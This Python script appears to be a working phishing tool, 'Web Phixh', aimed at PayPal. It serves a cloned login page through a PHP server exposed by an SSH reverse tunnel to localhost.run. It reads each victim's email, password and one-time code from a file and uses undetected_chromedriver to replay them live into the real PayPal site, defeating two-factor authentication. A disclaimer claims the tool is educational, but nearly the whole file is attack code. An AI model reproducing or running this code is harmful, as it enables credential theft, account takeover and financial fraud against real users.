import os
print("")
print("-------------------------------------")

print("Loading...........    Please wait")
print("-------------------------------------")
print("")
print("")

print("------------------>Warining: Test this tool in your own lab.....<------------------")


import subprocess
import time
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
import json
import sys
import first #as create_site_folder 
#import first as download_and_extract_zip
#import first as delete_validate_files



#print("Please wait............")



#print("Please wait..........")

ascii_art = """
██╗    ██╗███████╗██████╗                    
██║    ██║██╔════╝██╔══██╗               -------------------------------------    
██║ █╗ ██║█████╗  ██████╔╝                           Disclaimer
██║███╗██║██╔══╝  ██╔══██╗              This Tool Is For Educational Purpose Only.     
╚███╔███╔╝███████╗██████╔╝         The Developer Does Not Support Or Condone Any Illegal           
 ╚══╝╚══╝ ╚══════╝╚═════╝                    Or Unethical Behaviour. By Using this Tool, You Agree To Use It For
          ██████╗ ██╗  ██╗██╗██╗  ██╗██╗  ██╗      Demonstration And Educational Purpose.
          ██╔══██╗██║  ██║██║╚██╗██╔╝██║  ██║        ----------------------------------------
          ██████╔╝███████║██║ ╚███╔╝ ███████║                 Test It In Your Own Lab 
          ██╔═══╝ ██╔══██║██║ ██╔██╗ ██╔══██║        ----------------------------------------
          ██║     ██║  ██║██║██╔╝ ██╗██║  ██║
          ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ version 1.0       ------------------
        *************************************                   [ By Nuhu Tahiru ] 
                                                                ------------------

________________________________________________________________________________________________________________________
                                           ____   .   .                    
                                            |est  |t  |n  Your  Own  lab....

                                                     By Nuhu Tahiru

________________________________________________________________________________________________________________________

"""

#options = webdriver.ChromeOptions()

#driver = uc.Chrome()
#driver.get("https://login.live.com")
#driver.get('https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin')


# Print the ASCII art
#print(ascii_art)
# Function to print text slowly


# Print the logo with colors
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)


slowprint(ascii_art)

print("Please wait...............")
# Call the functions
#create_site_folder()
#download_and_extract_zip()
#delete_validate_files()





# Read templates.json and print nested dictionaries
json_file = 'site/templates.json'
with open(json_file, 'r') as f:
    data = json.load(f)
    for item in data:
        #print(item['name'])
        #print(item['choice'])
        #print()
        pass

test = """
                               
                                           TESTED SITE
                           -------------------------------------
                              [44]-GOOGLE  !NOT AVAILABLE

                              [440]-OUTLOOK !NOT AVAILABLE

                              [444]-PAYPAL       
                           -------------------------------------
"""
print(test)

Choice = """
       --------------------------
       SELECT A CHOICE [1]-OR-[2]
       --------------------------
"""
print(Choice)

# Ask user to select a choice
selected_choice = input("SELECT: ")

slowprint("Please Wait......... Your browser is loading up.")
print("press Ctrl + C to quit")

# Find the selected choice and open the corresponding folder

options = webdriver.ChromeOptions()
#options.add_argument(r'--user-data-dir=C:\Users\H4CK1NG\AppData\Local\Google\Chrome\User Data\Profile 1')

driver = uc.Chrome()
# Create a ChromeDriver service

# Create a ChromeDriver instance


# Open the login page
driver.get("https://www.paypal.com/us/home")  


selected_folder = None
for item in data:
    if item['choice'] == selected_choice:
        selected_folder = item['otp_folder']
        folder_path = os.path.join('site', selected_folder)
        break

if selected_folder:
    # Start PHP server in the chosen folder
    php_process = subprocess.Popen(['php', '-S', 'localhost:8080'], cwd=folder_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Create tunnel
    tunnel_process = subprocess.Popen(['ssh', '-R', '80:localhost:8080', 'nokey@localhost.run'])

# Rest of the code...
# Wait for the PHP script to receive the email and password
username_file = os.path.join(folder_path, 'usernames.txt')

if username_file == True: 
    os.remove(username_file)

else:
    pass

while not os.path.isfile(username_file):
    time.sleep(1)  # Wait for 1 second before checking again



while True:
    with open(username_file, 'r') as f:
        lines = f.readlines()

    if len(lines) >= 2:
        email = lines[0].strip().split(':')[1].strip()
    #if len(lines) >= 2:    
    #    password = lines[1].strip().split(':')[1].strip()
        break  # Exit the loop if email and password are successfully extracted
    else:
        print("Waiting for Email............")
        print("------------------------------------------")
        print("")
        time.sleep(1)  # Wait for 5 seconds before checking again
email = email
#password = password

if email:

    print(email)
    print("----------------------------------")
    #print(password)
    # Set Chrome options
    #options = webdriver.ChromeOptions()
    #options.add_argument(r'--user-data-dir=C:\Users\H4CK1NG\AppData\Local\Google\Chrome\User Data\Profile 1')

    #driver = uc.Chrome()
    # Create a ChromeDriver service

    # Create a ChromeDriver instance
    

    # Open the login page
    #driver.get("https://www.paypal.com/us/home")  # Replace with the actual login page URL


    time.sleep(3)
    
    sign = driver.find_element(by="id", value="_ul-btn_1ijeh_1")
    sign.click()

    time.sleep(1)

    # Find the email input field and enter the email
    email_input = driver.find_element(by="id", value="email")  # Replace with the actual ID of the email input field
    email_input.send_keys(email)

    #time.sleep(2)
    # Click on the next button
    # Find and click the login button
    login_button = driver.find_element(by="id", value="btnNext")  # Replace with the actual ID of the login button
    login_button.click()


    while True:
        with open(username_file, 'r') as f:
            lines = f.readlines()

        #if len(lines) >= 1:
        #   email = lines[0].strip().split(':')[1].strip()
        if len(lines) >= 2:    
            password = lines[1].strip().split(':')[1].strip()
            break  # Exit the loop if email and password are successfully extracted
        else:
            print("Waiting for Password............")
            print("------------------------------------------")
            print("")
            time.sleep(1) 

    time.sleep(3)

    password = password

    # Find the password input field and enter the password
    password_input = driver.find_element(by="id", value="password")  # Replace with the actual ID of the password input field
    password_input.send_keys(password)

    #time.sleep(2)
    # Find and click the login button
    #login_button = driver.find_element(by="id", value="idSIButton9")  # Replace with the actual ID of the login button
    #login_button.click()

 
    time.sleep(3)
    # Find and click the login button
    login_button = driver.find_element(by="id", value="btnLogin")  # Replace with the actual ID of the login button
    login_button.click()

    # Rest of your code...
    # Add any further actions you want to perform after successful login
    #OTP

    while True:
        with open(username_file, 'r') as f:
            lines = f.readlines()

        if len(lines) >= 3:
            otp = lines[2].strip().split(':')[1].strip()
        #if len(lines) >= 2:    
        #    password = lines[1].strip().split(':')[1].strip()
            break  # Exit the loop if email and password are successfully extracted
        else:
            print("Waiting for OTP............")
            print("------------------------------------------")
            print("")
            print("press Ctrl + C to quit")
            time.sleep(1)  # Wait for 5 seconds before checking again
    otp = otp

    
    txt_str = str(otp)
    x = [int(digit) for digit in txt_str]

    # Print the digit at index 4 (since indices start from 0)
    #print(x[4])


    the_ids = ["ci-otpCode-0", "ci-otpCode-1", "ci-otpCode-2", "ci-otpCode-3", "ci-otpCode-4", "ci-otpCode-5"]

    for i, n in zip(the_ids, x):
        password_input = driver.find_element(by="id", value=(i))  # Replace with the actual ID of the password input field
        password_input.send_keys(n)

        time.sleep(1)

    selec = "#content > div.twofactorPage > div > form > button"

    login_button = driver.find_element(By.CSS_SELECTOR, selec)
    login_button.click()
    # OTP
     
    # Wait for some time (optional)
    driver.implicitly_wait(5)

    # Close the browser
    #driver.quit()
else:
    print('Invalid choice selected.')

# Wait for tunnel process to finish
if tunnel_process:
    tunnel_process.wait()

# Wait for PHP server process to finish
if php_process:
    php_process.wait()